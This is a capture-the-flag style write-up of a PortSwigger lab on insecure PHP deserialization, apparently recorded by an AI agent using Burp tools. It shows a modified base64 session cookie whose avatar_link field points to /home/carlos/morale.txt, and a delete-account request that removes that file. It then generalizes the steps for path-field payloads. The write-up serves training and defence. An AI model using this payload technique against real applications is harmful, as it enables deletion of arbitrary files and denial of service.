# PortSwigger Lab

## Lab

Using application functionality to exploit insecure deserialization

URL: https://0ac4001203a8e4e3844e414f00040069.web-security-academy.net/

## Vulnerability Class

Deserialization – PHP serialized `User` object in base64 session cookie with attacker-controllable `avatar_link` file path consumed by dangerous `delete account` functionality (arbitrary file delete via application feature)

## Objective

Delete `/home/carlos/morale.txt` via serialized `avatar_link` + `POST /my-account/delete`. Established by lab description objective (read for objective only – solution steps noted but not blindly followed; evidence confirmed each step). Official solution text was retrieved with description fetch – treated as hypothesis source only.

## Initial Observations

- `GET /` → 200 `is-notsolved`, empty `session=;`, blog + `/my-account` links.
- `POST /login wiener:peter` → 302 to `/my-account?id=wiener`, `session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5ZWZtZTU3Mmw5a2YzMnI2ZXpudWZ5eDR1Y2J3bnA5eSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d`.
- Decoded: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"yefme572l9kf32r6eznufyx4ucbwnp9y";s:11:"avatar_link";s:19:"users/wiener/avatar";}` – 3-field User vs 2-field User in prior deserialization lab.
- `GET /my-account?id=wiener` → 200 with avatar upload (`POST /my-account/avatar`), change-email, and `POST /my-account/delete` (Delete account button). Prior lab had `/admin` panel; this instance has no admin panel – different sink.
- Stored knowledge: `knowledge/portswigger/labs/deserialization-modifying-serialized-objects.md` (just created) gave base64→PHP→length handling + no-MAC pattern. No deserialization methodology file exists yet.

## Hypotheses

- H1: `avatar_link` is used as filesystem path by delete-account feature. Changing it to `/home/carlos/morale.txt` (with `s:19`→`s:23`) causes victim-file delete on `POST /my-account/delete`.
- H2: `access_token`/`username` must stay intact (session binding). Only `avatar_link` value + length change, one variable.
- H3: No integrity check (single blob, as in prior lab). Evidence needed: server accepts re-encoded object and deletes account (302 + session cleared).

## Attempts

1. Baseline `GET /` + `POST /login` → session captured, decoded – foundation.
2. `GET /my-account?id=wiener` with original cookie → 200 account page with delete form – mapped dangerous feature without invoking it.
3. Crafted `O:4:"User":3:{...s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}` (counted 23: `/home/carlos/morale.txt`) → base64 → `Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5ZWZtZTU3Mmw5a2YzMnI2ZXpudWZ5eDR1Y2J3bnA5eSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9` (no URL-encoding needed).
4. `POST /my-account/delete` with modified cookie → 302 to `/`, `Set-Cookie: session=;` (account deleted). WORKED first injection.
5. `GET /` → `is-solved` / `Solved` / `Congratulations`.

## What Failed

- Nothing material. Did not need backup account `gregg:rosebud`; did not need avatar upload probing – delete sink identified from page structure + lab objective.

## What Worked

- Single-field path swap `users/wiener/avatar` (19) → `/home/carlos/morale.txt` (23) with length fix, then `POST /my-account/delete` → 302 → `is-solved`.

## Burp Observations

- All via Burp MCP `burp_send_http1_request` (5 requests). `burp_base64_decode`/`encode` for transform. Fast 200/302 differentials; no timing oracle needed.
- `POST /my-account/delete` 302 + session clear is the execution signal; `/` solved marker is the impact proof.

## Browser Observations

- Not required. Pure HTTP cookie replay.

## CLI / Tool Observations

- No CLI, crawling, or fuzzing – no discovery question. Smallest toolset per principle.

## Root Cause

Insecure deserialization with dangerous consumption: PHP-serialized `User` stored client-side (base64, no MAC) includes `avatar_link` filesystem path. Delete-account feature passes deserialized `avatar_link` to file-delete routine without constraining to own avatar directory. Attacker-controlled path → arbitrary file delete (here `/home/carlos/morale.txt`) plus self-account delete. Data (cookie bytes) becomes trusted object state becomes filesystem action.

## Verification

- Single-variable change (only `avatar_link` value + its `s:` length, same `username`/`access_token`/session).
- Execution proved by 302 + session cleared (account gone).
- Impact proved by `/` marker `is-notsolved` → `is-solved`. Did not rely on 200 alone.
- Backup account not needed for proof – solved marker arbitrates.

## Impact

Authenticated arbitrary file deletion via own-account-delete feature. Demonstrated by deleting Carlos's `morale.txt`. Same primitive in real apps yields config/key/log deletion, DoS, or auth bypass where file identity matters.

## Why The Successful Approach Worked

- Reused prior lab's decode-substitution-encode discipline instead of re-deriving PHP format, but did NOT copy prior payload (`admin b:1` would do nothing here – different object shape with 3 fields, no `admin`).
- Length repair (`19`→`23`) was load-bearing – PHP `s:N` must match byte length or unserialize fails.
- Targeted dangerous feature (delete) rather than privilege flag – read page to locate sink first.

## Generalization

- For serialized objects with path fields: decode → locate path-like attributes (`avatar_link`, `filename`, `path`) → swap to absolute victim path with correct `s:N` → invoke the feature that consumes it (delete, load, include) → check solved/state marker.
- String edits require length updates; boolean/int flips do not. Count bytes exactly (`/home/carlos/morale.txt` = 23).
- Two deserialization shapes now seen: 2-field (`username`+`admin` → privilege flip) vs 3-field (`username`+`access_token`+`avatar_link` → file-action). Shape dictates sink.

## Lessons Learned

- Application-functionality deserialization: the flaw is not the object alone but object × dangerous method (delete reads path). Map features before editing.
- Length prefix is the silent killer – one miscount = failed unserialize with no error detail.
- Prior lab as hypothesis source, not proof: same base64-PHP-no-MAC pattern transferred, but payload rebuilt for new shape/goal.

## Related Methodology

- No deserialization methodology file exists yet. Partial overlap: `methodology/access-control.md` (escalation verification), prior lab note `deserialization-modifying-serialized-objects.md` (encoding discipline).
- `methodology/injection.md` does NOT apply (SQL/OS-command vs object/file-action). Deliberately not modified.
- Candidate for new `methodology/deserialization.md` now that 2 labs share base pattern – proposed below.

## References

- Solved instance: https://0ac4001203a8e4e3844e414f00040069.web-security-academy.net/
- Lab: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization
- Prior lab: knowledge/portswigger/labs/deserialization-modifying-serialized-objects.md
- Objective read from lab description; solution steps seen during fetch but validated independently via evidence.
